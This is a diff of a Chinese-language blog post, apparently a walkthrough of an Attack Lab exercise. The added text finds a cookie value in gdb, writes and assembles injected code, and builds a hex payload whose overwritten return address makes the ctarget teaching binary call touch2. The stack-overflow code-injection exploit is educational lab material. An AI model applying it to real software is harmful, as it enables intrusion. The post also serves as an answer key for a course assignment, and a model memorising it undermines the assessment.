@@ -362,11 +362,52 @@ PASS: Would have posted the following:
 <span class="mh">0x5561dc98</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000004017c0</span>
 </code></pre></div></div>
 
-<p>下面来看一下我们需要执行的代码应该怎么写，这里需要就 <code class="language-plaintext highlighter-rouge">val</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 的值，可以简单地将 level1 中 <code class="language-plaintext highlighter-rouge">touch1</code> 的地址修改为 <code class="language-plaintext highlighter-rouge">touch2</code> 即执行到 <code class="language-plaintext highlighter-rouge">touch2</code> 中，然后通过 <code class="language-plaintext highlighter-rouge">x 0x6044e4</code> 发现 <code class="language-plaintext highlighter-rouge">cookie</code> 的值为 <code class="language-plaintext highlighter-rouge">0x59b997fa</code>，所以只需要把 <code class="language-plaintext highlighter-rouge">%rdi</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 值即可，要写入的代码如下</p>
+<p>下面来看一下我们需要执行的代码应该怎么写，这里需要就 <code class="language-plaintext highlighter-rouge">val</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 的值，那么如何找到 <code class="language-plaintext highlighter-rouge">cookie</code> 的值呢？</p>
+
+<p>可以运行到 <code class="language-plaintext highlighter-rouge">touch2</code> 然后打断点，简单地将 level1 中 <code class="language-plaintext highlighter-rouge">touch1</code> 的地址修改为 <code class="language-plaintext highlighter-rouge">touch2</code> 即执行到 <code class="language-plaintext highlighter-rouge">touch2</code> 中，然后通过在 gdb 中运行 <code class="language-plaintext highlighter-rouge">x 0x6044e4</code> 发现 <code class="language-plaintext highlighter-rouge">cookie</code> 的值为 <code class="language-plaintext highlighter-rouge">0x59b997fa</code>，所以只需要把 <code class="language-plaintext highlighter-rouge">%rdi</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 值即可。</p>
+
+<p>所以要执行的代码就是设置 <code class="language-plaintext highlighter-rouge">val</code> 的值，即为 <code class="language-plaintext highlighter-rouge">touch2</code> 函数的第一个参数，对应寄存器为 <code class="language-plaintext highlighter-rouge">$rdi</code>，接着再执行 <code class="language-plaintext highlighter-rouge">touch2</code> 函数，这里可以首先将 <code class="language-plaintext highlighter-rouge">touch2</code> 的地址压到栈里面，执行完指令之后，通过 <code class="language-plaintext highlighter-rouge">retq</code> 就可以执行这个压栈地址对应的 procedure，这种方式相对来说最简单，那么对应的代码如下</p>
 
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pushq</span> <span class="nx">$0x4017ec</span>
 <span class="nx">movq</span> <span class="nx">$0x59b997fa</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
 <span class="nx">ret</span>
+</code></pre></div></div>
+
+<p>将这个文件保存为 <code class="language-plaintext highlighter-rouge">example.s</code>，然后通过下面的方式，首先 assemble 这个文件，然后 disassemble 它</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix&gt; gcc <span class="nt">-s</span> example.s
+unix&gt; objdump <span class="nt">-d</span> example.o <span class="o">&gt;</span> example.d
+</code></pre></div></div>
+
+<p>这样就可以得到 <code class="language-plaintext highlighter-rouge">example.d</code> 的文件如下</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Disassembly</span> <span class="k">of</span> <span class="nx">section</span> <span class="p">.</span><span class="nx">text</span><span class="p">:</span>
+
+<span class="mi">0000000000000000</span> <span class="o">&lt;</span><span class="p">.</span><span class="nx">text</span><span class="o">&gt;</span><span class="p">:</span>
+   <span class="mi">0</span><span class="p">:</span>	<span class="mi">68</span> <span class="nx">ec</span> <span class="mi">17</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nx">pushq</span>  <span class="nx">$0x4017ec</span>
+   <span class="mi">5</span><span class="p">:</span>	<span class="mi">48</span> <span class="nx">c7</span> <span class="nx">c7</span> <span class="nx">fa</span> <span class="mi">97</span> <span class="nx">b9</span> <span class="mi">59</span> 	<span class="nx">mov</span>    <span class="nx">$0x59b997fa</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+   <span class="nx">c</span><span class="p">:</span>	<span class="nx">c3</span>                   	<span class="nx">retq</span>   
+</code></pre></div></div>
+
+<p>从上面的代码中就可以看出，对应的 3 个汇编指令的字节码，比如第一个 <code class="language-plaintext highlighter-rouge">pushq</code> 的字节码就是 <code class="language-plaintext highlighter-rouge">68 ec 17 40 00</code>，最终写入的 txt 文本为</p>
+
+<pre><code class="language-txt">68 ec 17 40 00
+48 c7 c7 fa 97 b9 59
+c3
+00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00
+78 dc 61 55
+</code></pre>
+
+<p>中间的 <code class="language-plaintext highlighter-rouge">00</code> 是为了填充空白的内存，最后在栈顶将返回的地址替换成 <code class="language-plaintext highlighter-rouge">0x5561dc78</code>，这样就会执行写入字符串的 3 个指令，接着再执行 <code class="language-plaintext highlighter-rouge">touch2</code>。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./hex2raw <span class="nt">-i</span> ctarget.2.txt| ./ctarget <span class="nt">-q</span> 
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2<span class="o">(</span>0x59b997fa<span class="o">)</span>
+Valid solution <span class="k">for </span>level 2 with target ctarget
+PASS: Would have posted the following:
 </code></pre></div></div>
 
 <h4 id="0x13-level-3">
